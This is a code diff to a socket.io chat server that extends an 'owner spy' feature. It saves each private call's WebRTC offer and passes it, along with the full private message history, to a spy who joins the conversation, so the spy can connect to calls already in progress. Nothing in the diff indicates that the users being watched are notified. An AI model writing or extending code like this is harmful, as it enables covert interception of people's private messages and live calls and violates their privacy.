@@ -85,7 +85,7 @@ const memUsers = {
 };
 const memMessages = {};
 const memPMs = {}; // { 'user1||user2': [{from,to,text,time,ts},...] }
-const activeCalls = {}; // { 'user1||user2': { type, startTime } }
+const activeCalls = {}; // { 'user1||user2': { type, startTime, user1, user2, offer } }
 const banLog = []; // memory ban log
 const memBadges = []; // [{id,name,emoji,color,description}]
 const memUserBadges = {}; // { username: [badge_id,...] }
@@ -1090,7 +1090,7 @@ io.on('connection', (socket) => {
     if (toSid) io.to(toSid).emit('call-offer', { ...data, from: user.name });
     // Track active call
     const convKey = [user.name, data.to].sort().join('||');
-    activeCalls[convKey] = { type: data.type, startTime: Date.now(), user1: user.name, user2: data.to };
+    activeCalls[convKey] = { type: data.type, startTime: Date.now(), user1: user.name, user2: data.to, offer: data.offer };
     // Notify owner spies watching this PM conversation
     io.to('spy||' + convKey).emit('spy-call-offer', { ...data, from: user.name, convKey });
   });
@@ -1200,9 +1200,21 @@ io.on('connection', (socket) => {
     socket.join(spyRoom);
     const history = memPMs[key] || [];
     socket.emit('spy-history', { key, user1: data.user1, user2: data.user2, messages: history });
-    // Send active call info if there's an ongoing call
+    // If there's an active call with a saved offer, send it so spy can connect
     if (activeCalls[key]) {
-      socket.emit('spy-call-active', { ...activeCalls[key], convKey: key });
+      const call = activeCalls[key];
+      if (call.offer) {
+        // Send as spy-call-offer so the client handles it the same way
+        socket.emit('spy-call-offer', {
+          offer: call.offer,
+          type: call.type,
+          from: call.user1,
+          convKey: key
+        });
+      } else {
+        // No offer saved — just notify
+        socket.emit('spy-call-active', { ...call, convKey: key });
+      }
     }
   });
   socket.on('spy-leave', (data) => {
